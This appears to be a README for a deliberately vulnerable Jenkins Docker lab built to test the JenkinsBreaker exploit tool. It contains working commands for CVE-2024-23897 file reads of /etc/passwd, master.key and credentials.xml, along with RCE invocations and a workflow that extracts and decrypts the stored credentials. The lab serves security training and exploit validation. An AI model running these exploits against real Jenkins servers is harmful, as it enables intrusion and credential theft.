# Jenkins Lab Docker Environment

Comprehensive testing environment for JenkinsBreaker exploit validation.

## Overview

The Jenkins Lab is a purpose-built vulnerable Jenkins environment designed for:
- CVE exploit validation
- Red team training
- CTF preparation
- Security research
- Incident response practice

## Features

### Vulnerable Jenkins Core
- Jenkins version with 11 exploitable CVEs
- CSRF protection disabled
- CLI interface enabled
- Script Console accessible
- Agent connections permitted

### Planted Credentials (16 Total)

| Type | Location | Count | Extractable Via |
|------|----------|-------|----------------|
| AWS | `~/.aws/credentials` | 2 | CVE-2024-23897, Groovy |
| SSH | `~/.ssh/id_rsa` | 1 | CVE-2024-23897, Groovy |
| NPM | `~/.npmrc` | 1 | CVE-2024-23897, Groovy |
| Docker | `~/.docker/config.json` | 1 | CVE-2024-23897, Groovy |
| Maven | `~/.m2/settings.xml` | 1 | CVE-2024-23897, Groovy |
| Database | `~/.config/database.env` | 3 | CVE-2024-23897, Groovy |
| API Keys | `~/.config/api_keys.env` | 17 | CVE-2024-23897, Groovy |
| Cloud | `~/.config/cloud.env` | 3 | CVE-2024-23897, Groovy |
| Jenkins | `credentials.xml` | 16 | API, offsec-jenkins |

### Pre-Configured Pipelines

6 vulnerable pipeline jobs with embedded secrets:
- AWS deployment pipeline (AWS credentials)
- NPM publish pipeline (NPM token)
- Docker build pipeline (Docker auth)
- SSH deployment (SSH private key)
- Database migration (DB credentials)
- Cloud provisioning (GCP/Azure credentials)

### Privilege Escalation Vectors

- `sudo NOPASSWD` for jenkins user
- Writable cron directories
- World-writable scripts in PATH
- Jenkins user in docker group
- Exposed Docker socket

## Quick Start

### Starting the Lab

```bash
cd jenkins-lab
docker-compose up -d
```

Wait 60 seconds for Jenkins to fully initialize.

**Access:**
- URL: http://localhost:8080
- Username: `admin`
- Password: `admin`

### Verifying Lab Status

```bash
# Check if container is running
docker-compose ps

# View logs
docker-compose logs -f

# Check Jenkins health
curl -I http://localhost:8080
```

### Stopping the Lab

```bash
cd jenkins-lab
docker-compose down

# Remove volumes completely (clean slate)
docker-compose down -v
```

## Testing Exploits

### CVE-2024-23897 (CLI Arbitrary File Read)

```bash
# Download CLI jar
wget http://localhost:8080/jnlpJars/jenkins-cli.jar

# Read /etc/passwd
java -jar jenkins-cli.jar -s http://localhost:8080/ help "@/etc/passwd"

# Extract master.key
java -jar jenkins-cli.jar -s http://localhost:8080/ help "@/var/jenkins_home/secrets/master.key"

# Extract credentials
java -jar jenkins-cli.jar -s http://localhost:8080/ help "@/var/jenkins_home/credentials.xml"
```

### CVE-2024-43044 (Agent File Read to RCE)

```bash
# Using JenkinsBreaker
python3 JenkinsBreaker.py \
  --url http://localhost:8080 \
  --exploit-cve CVE-2024-43044 \
  --mode full_rce \
  --command "whoami"
```

### Authenticated RCE via Script Console

```bash
python3 JenkinsBreaker.py \
  --url http://localhost:8080 \
  --username admin \
  --password admin \
  --script-console \
  --command "println 'id'.execute().text"
```

### Full Exploitation Chain

```bash
cd jenkins-lab/scripts
./test_exploits_production.sh
```

## Credential Extraction Workflow

### Automated Extraction

```bash
# Extract all secrets with JenkinsBreaker
python3 JenkinsBreaker.py \
  --url http://localhost:8080 \
  --username admin \
  --password admin \
  --extract-secrets \
  --output ./loot

# Decrypt with offsec-jenkins
cd ../Jenkins-Credential-Decryptor
python3 decrypt.py \
  --key ../JenkinsBreaker/loot/secrets/master.key \
  --secret ../JenkinsBreaker/loot/secrets/hudson.util.Secret \
  --xml ../JenkinsBreaker/loot/credentials.xml \
  --reveal-secrets \
  --export-json decrypted.json
```

### Manual Extraction

```bash
# Extract files from Docker container
docker exec jenkins-lab cat /var/jenkins_home/secrets/master.key > loot/master.key
docker exec jenkins-lab cat /var/jenkins_home/secrets/hudson.util.Secret > loot/hudson.util.Secret
docker exec jenkins-lab cat /var/jenkins_home/credentials.xml > loot/credentials.xml
docker exec jenkins-lab cat /home/jenkins/.aws/credentials > loot/aws_credentials
docker exec jenkins-lab cat /home/jenkins/.ssh/id_rsa > loot/id_rsa
```

## Lab Architecture

### Directory Structure

```
jenkins-lab/
├── docker-compose.yml          # Container orchestration
├── jenkins/
│   ├── jenkins.yaml            # Jenkins Configuration as Code
│   ├── jobs/                   # Pre-configured pipeline jobs
│   ├── credentials.xml         # Encrypted credentials
│   └── secrets/
│       ├── master.key          # Master encryption key
│       └── hudson.util.Secret  # Secret decryption key
├── scripts/
│   ├── test_exploits_production.sh   # Automated exploit testing
│   ├── plant_secrets.sh              # Re-plant credentials
│   └── reset_lab.sh                  # Reset to clean state
└── README.md
```

### Networking

- **Host Port**: 8080
- **Container Port**: 8080
- **Network Mode**: Bridge
- **Exposed Services**: HTTP, CLI

### Volumes

```yaml
volumes:
  jenkins_home:
    driver: local
```

Persistent data stored in Docker volume for state preservation.

## Advanced Lab Features

### Resetting Lab State

```bash
cd jenkins-lab/scripts
./reset_lab.sh
```

Resets:
- All job configurations
- Credential store
- Build history
- Logs

### Custom Credential Planting

Edit `jenkins/credentials.xml` to add custom test credentials:

```xml
<entry>
  <string>custom-credential-id</string>
  <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
    <scope>GLOBAL</scope>
    <id>custom-credential-id</id>
    <description>Custom test credential</description>
    <username>testuser</username>
    <password>{AQAAABAAAAAwxyz...}</password>  <!-- Encrypted with master.key -->
  </com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
</entry>
```

Restart container to apply:
```bash
docker-compose restart
```

### Installing Additional Plugins

Add to `jenkins/jenkins.yaml`:

```yaml
jenkins:
  installPlugins:
    - git:latest
    - workflow-aggregator:latest
    - credentials-binding:latest
    - your-plugin-here:version
```

### Enabling Additional CVEs

The lab supports the following CVEs out of the box:
- CVE-2024-23897 (CLI File Read)
- CVE-2024-43044 (Agent File Read)
- CVE-2019-1003029 (Groovy RCE)
- CVE-2018-1000861 (Stapler RCE)
- CVE-2017-1000353 (CLI Deserialization)
- And 6 more...

To enable additional vulnerabilities, install specific plugin versions via JCasC.

## Integration with JenkinsBreaker

### Automated Testing

```bash
# Run full test suite against lab
cd JenkinsBreaker
pytest tests/integration/ -v --target=http://localhost:8080
```

### TUI Testing

```bash
python3 launch_tui.py \
  --url http://localhost:8080 \
  --username admin \
  --password admin
```

### WebUI Testing

```bash
python3 launch_webui.py
# Navigate to: http://localhost:8000
# Add target: http://localhost:8080
```

## Troubleshooting

### Jenkins Not Starting

```bash
# Check container logs
docker-compose logs jenkins

# Verify port not in use
netstat -an | grep 8080

# Restart container
docker-compose restart
```

### Permission Denied Errors

```bash
# Fix volume permissions
docker-compose down -v
docker volume rm jenkins-lab_jenkins_home
docker-compose up -d
```

### Credentials Not Decrypting

Ensure master.key and hudson.util.Secret are extracted correctly:

```bash
# Verify file sizes
ls -lh loot/master.key loot/hudson.util.Secret

# master.key should be 16 bytes (AES-128)
# hudson.util.Secret should be 256 bytes

# Re-extract if needed
docker exec jenkins-lab cat /var/jenkins_home/secrets/master.key | xxd
```

### Exploits Failing

1. Verify Jenkins is fully initialized (wait 60+ seconds after startup)
2. Check authentication: `curl -u admin:admin http://localhost:8080/api/json`
3. Verify CLI is enabled: `curl http://localhost:8080/cli`
4. Check Docker logs: `docker-compose logs -f`

## Security Warnings

This lab is **intentionally vulnerable** and should **NEVER** be exposed to the internet or untrusted networks.

**Safe Usage:**
- Run on localhost only
- Use in isolated networks
- Do not persist sensitive data
- Reset frequently

**Unsafe:**
- Exposing to 0.0.0.0
- Running in production networks
- Storing real credentials
- Long-term operation

## Lab Variants

### Hardened Lab (Blue Team Training)

```bash
cd jenkins-lab
docker-compose -f docker-compose.hardened.yml up -d
```

Features:
- CSRF protection enabled
- Authorization required
- Security plugins installed
- Audit logging enabled

### Multi-Node Lab

```bash
docker-compose -f docker-compose.multi-node.yml up -d
```

Features:
- 1 controller + 2 agents
- Agent-to-controller security enabled
- Realistic distributed environment

## References

- [Lab Credentials Reference](../jenkins-lab/README_CREDENTIALS.md)
- [Secrets Reference](../jenkins-lab/SECRETS_REFERENCE.md)
- [Plugin Vulnerability Map](../jenkins-lab/PLUGIN_VULNERABILITY_MAP.md)
- [Security Notice](../jenkins-lab/SECURITY_NOTICE.md)
